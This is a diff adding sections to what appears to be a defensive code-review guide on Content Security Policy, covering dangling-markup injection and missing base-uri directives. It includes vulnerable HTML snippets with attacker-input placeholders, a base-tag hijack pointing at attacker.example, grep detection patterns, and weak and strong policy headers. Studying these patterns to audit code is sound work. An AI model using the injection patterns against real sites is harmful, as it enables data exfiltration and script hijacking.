@@ -107,6 +107,50 @@ script-src 'self' https://ajax.googleapis.com/ajax/libs/angularjs/
 
 Grep: `jsonp`, `callback=`, `angular\.js`, `angular.min.js` inside CSP directive strings; `strict-dynamic` without `'nonce-` or `'sha256-`.
 
+### Dangling-markup injection sinks (grep)
+
+CSP that blocks `script-src` does **not** stop **dangling markup**: user input reflected into HTML **without closing the opening tag** lets the browser treat the remainder of the page as attribute value or URL, enabling exfiltration or navigation without executable script.
+
+**Vulnerable reflection patterns** (truncated attribute — no closing quote before next markup):
+
+```html
+<!-- VULN — reflected query in unclosed src -->
+<img src='https://app.example/search?q=ATTACKER_INPUT
+<!-- browser reads through page as URL; exfil via DNS/query to attacker host -->
+
+<!-- VULN — meta refresh with unclosed content -->
+<meta http-equiv="refresh" content="0;url=ATTACKER_INPUT
+
+<!-- VULN — table background URL not terminated -->
+<table background="//ATTACKER_INPUT
+
+<!-- VULN — base href hijack (see base-uri below) -->
+<base href='ATTACKER_INPUT
+```
+
+**Grep seeds** (application templates / handlers):
+- User/template variable immediately after `'`, `"`, or `=` in tag openers: `<img[^>]*src=['"]\{\{`, `\+ req\.query`, `\+ user\.`
+- Missing closing quote on same line before `>` or `%>` / `</`
+- `echo.*<img`, `render.*background=`, `http-equiv.*refresh.*content=`
+
+**SAFE**: encode for HTML attribute context; always terminate attributes; prefer CSP **plus** strict output encoding — CSP alone is insufficient when dangling markup is possible.
+
+### Mandatory `base-uri 'none'` / `'self'`
+
+Without `base-uri`, a dangling `<base href='//attacker.example/'` (or full `<base>` injection via XSS) retargets **all relative** `script`, `link`, `img`, and `a` URLs on the page — bypassing `'self'`-only `script-src` by loading `/app.js` from the attacker origin.
+
+```http
+# WEAK — script-src strict but base-uri absent; relative script URLs hijackable
+Content-Security-Policy: default-src 'self'; script-src 'self';
+```
+
+```http
+# STRONG — pair script policy with base-uri lockdown
+Content-Security-Policy: default-src 'self'; script-src 'self'; base-uri 'none'; object-src 'none';
+```
+
+**Grep seeds**: policy strings missing `base-uri` entirely; HTML handlers emitting `<base` without server-side allowlist; reflected input adjacent to `<base href='` without closing quote (dangling-markup variant above).
+
 ## Weak vs Strong Policy
 
 ### Missing CSP
